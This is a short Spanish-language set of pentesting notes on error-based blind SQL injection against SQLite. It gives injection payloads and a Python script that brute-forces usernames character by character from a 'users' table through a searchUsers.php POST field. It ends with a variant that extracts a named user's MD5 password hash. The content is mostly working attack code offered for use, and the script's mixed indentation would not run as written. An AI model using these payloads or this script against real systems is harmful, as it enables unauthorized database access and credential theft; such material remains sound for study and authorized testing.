# Inyecciones SQLite 

Tags: #SQLite 

* [SQLite](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/SQLite%20Injection/#sqlite-error-based)

```mysql 
❯ 1 '||1/1||'        # Forma inicial de inyección que devuelve un 'True'
❯ 1 '||1/0||'        # Devuelve un 'False'
```

## Conocer usuarios 

```mysql 
❯ 1 '||1/(substr((select username from users limit 0,1),1,1)='a')||'   # Del primer usuario en la tabla 'users' y columna 'username', su primer caracter inicia con la letra 'a'
```

```python 
#!/usr/bin/env python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://localhost/searchUsers.php"   # Se coloca 'Host + Ruta'
characters = string.ascii_letters + string.digits + '_-,:'  # Se puede colocar string.printable


def MakeSQLI():

	cookies = {
		'PHPSESSID': 'valor'
	}

    users = ""
    p1 = log.progress("SQLi")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Usuarios")
    
	for i in range(0,5):
		for j in range(1,40):
			for character in characters:
				post_data = {
					'catName': f"test'||1/(substr((select username from users limit {i},1),{j},1)='{character}')||'",
					'catId': '1'
				}

				p1.status(post_data['catName'])
				r = requests.post(main_url, data=post_data, cookies=cookies)
	
				if r.status_code == 200:
					users += character 
					p2.status(users)
					break
		users += ","

if __name__ == '__main__':
    MakeSQLI()

---
# Para conocer la password de un usuario en especifico 
test'||1/(substr((select password from users where username='alex'),{j},1)='{character}')||'

Nota:
	1. Quitar el primer bucle cuando se coloque esta consulta y la linea de 'users += ","'
	2. La password es en formato MD5 por lo que los caracteres serían: 'abcdef y string.digits'
```